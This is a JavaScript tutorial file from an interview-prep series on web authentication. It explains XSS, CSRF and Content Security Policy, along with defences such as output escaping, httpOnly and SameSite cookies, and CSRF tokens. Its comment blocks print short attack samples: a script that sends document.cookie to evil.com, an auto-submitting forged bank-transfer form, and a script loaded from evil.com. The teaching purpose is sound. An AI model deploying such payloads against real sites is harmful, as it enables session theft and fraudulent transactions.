/**
 * AUTHENTICATION: 07 - CSRF & XSS Protection
 *
 * ONE CONCEPT: The two main attacks against web auth and how to prevent them
 */


// =============================================================================
// XSS (Cross-Site Scripting)
// =============================================================================

console.log('=== XSS (Cross-Site Scripting) ===\n');

/**
 *   ┌──────────────────────────────────────────────────────────────────────┐
 *   │  XSS: Attacker injects malicious script into your page             │
 *   ├──────────────────────────────────────────────────────────────────────┤
 *   │                                                                      │
 *   │  Attack:                                                            │
 *   │  User submits: <script>fetch('evil.com?cookie='+document.cookie)  │
 *   │  If app renders this without escaping → script runs!              │
 *   │  → Steals cookies, tokens, user data                              │
 *   │                                                                      │
 *   │  TYPES:                                                             │
 *   │  Stored:    Script saved in DB, served to all users               │
 *   │  Reflected: Script in URL, reflected in response                  │
 *   │  DOM-based: Script modifies DOM via client-side JS                │
 *   │                                                                      │
 *   │  PREVENTION:                                                        │
 *   │  1. Output encoding (escape HTML: < → &lt;)                      │
 *   │     React does this by default! (JSX auto-escapes)                │
 *   │  2. Never use dangerouslySetInnerHTML with user input             │
 *   │  3. Content Security Policy (CSP) header                          │
 *   │     Content-Security-Policy: script-src 'self'                    │
 *   │  4. httpOnly cookies (JS can't read)                               │
 *   │  5. Sanitize user input (DOMPurify for HTML content)              │
 *   │                                                                      │
 *   └──────────────────────────────────────────────────────────────────────┘
 *
 */

console.log('XSS: attacker injects script into your page');
console.log('Prevention: escape output (React default), CSP, httpOnly cookies');
console.log('Never dangerouslySetInnerHTML with user data');


// =============================================================================
// CSRF (Cross-Site Request Forgery)
// =============================================================================

console.log('\n=== CSRF (Cross-Site Request Forgery) ===\n');

/**
 *   ┌──────────────────────────────────────────────────────────────────────┐
 *   │  CSRF: Trick user's browser into making authenticated requests     │
 *   ├──────────────────────────────────────────────────────────────────────┤
 *   │                                                                      │
 *   │  Attack:                                                            │
 *   │  1. User logged into bank.com (session cookie set)                │
 *   │  2. User visits evil.com                                           │
 *   │  3. evil.com has: <form action="bank.com/transfer" method="POST"> │
 *   │     <input name="to" value="attacker">                            │
 *   │     <input name="amount" value="10000">                           │
 *   │     </form><script>form.submit()</script>                         │
 *   │  4. Browser sends bank.com cookie automatically!                  │
 *   │  5. Bank processes transfer (valid session!)                       │
 *   │                                                                      │
 *   │  PREVENTION:                                                        │
 *   │  1. SameSite cookies (Lax or Strict)                               │
 *   │     Cookie NOT sent with cross-site requests                      │
 *   │     SameSite=Lax: sent with top-level GET navigation             │
 *   │     SameSite=Strict: never sent cross-site                        │
 *   │                                                                      │
 *   │  2. CSRF tokens                                                     │
 *   │     Server generates random token → embedded in form              │
 *   │     Server verifies token on submission                            │
 *   │     Attacker can't read the token from your page                  │
 *   │                                                                      │
 *   │  3. Check Origin/Referer headers                                   │
 *   │                                                                      │
 *   │  SameSite=Lax is default in modern browsers → major protection   │
 *   │                                                                      │
 *   └──────────────────────────────────────────────────────────────────────┘
 *
 */

console.log('CSRF: evil site triggers authenticated request using your cookies');
console.log('Prevention: SameSite cookies (Lax default), CSRF tokens');
console.log('SameSite=Lax is now the browser default → strong protection');


// =============================================================================
// CONTENT SECURITY POLICY
// =============================================================================

console.log('\n=== CSP (Content Security Policy) ===\n');

/**
 *   ┌──────────────────────────────────────────────────────────────────────┐
 *   │  CSP: Whitelist allowed resource sources                            │
 *   ├──────────────────────────────────────────────────────────────────────┤
 *   │                                                                      │
 *   │  Content-Security-Policy:                                           │
 *   │    default-src 'self';                                              │
 *   │    script-src 'self' https://cdn.example.com;                     │
 *   │    style-src 'self' 'unsafe-inline';                               │
 *   │    img-src 'self' https://images.example.com;                     │
 *   │    connect-src 'self' https://api.example.com;                    │
 *   │                                                                      │
 *   │  Even if attacker injects script:                                  │
 *   │  <script src="evil.com/steal.js">                                  │
 *   │  → BLOCKED by CSP (evil.com not in script-src)                   │
 *   │                                                                      │
 *   │  Inline scripts blocked unless 'unsafe-inline' or nonce           │
 *   │  Nonce: script-src 'nonce-abc123'                                  │
 *   │  <script nonce="abc123">...</script> → Allowed                    │
 *   │                                                                      │
 *   └──────────────────────────────────────────────────────────────────────┘
 *
 */

console.log('CSP whitelists allowed script/style/image sources');
console.log('Blocks injected scripts from unknown origins');
console.log('Use nonces for inline scripts instead of unsafe-inline');


// =============================================================================
// INTERVIEW: What to Say
// =============================================================================

/**
 * "XSS and CSRF are the two main web security threats. XSS injects
 * malicious scripts into your page to steal data. I prevent it by
 * never rendering unsanitized user input — React escapes by default,
 * and I never use dangerouslySetInnerHTML with user data. httpOnly
 * cookies prevent XSS from stealing session tokens. CSP headers
 * whitelist allowed script sources as a second defense layer.
 *
 * CSRF tricks the user's browser into making authenticated requests
 * to your server. It exploits the fact that cookies are sent
 * automatically with every request. SameSite=Lax cookies (now the
 * browser default) block cross-site cookie sending for most requests.
 * For extra protection, I use CSRF tokens in forms — a random token
 * embedded in the page that the attacker can't access.
 *
 * This is why I store refresh tokens in httpOnly, SameSite=Strict
 * cookies — protected from both XSS (can't read) and CSRF (won't
 * send cross-site)."
 */


// RUN: node docs/31-authentication/07-csrf-xss-protection.js
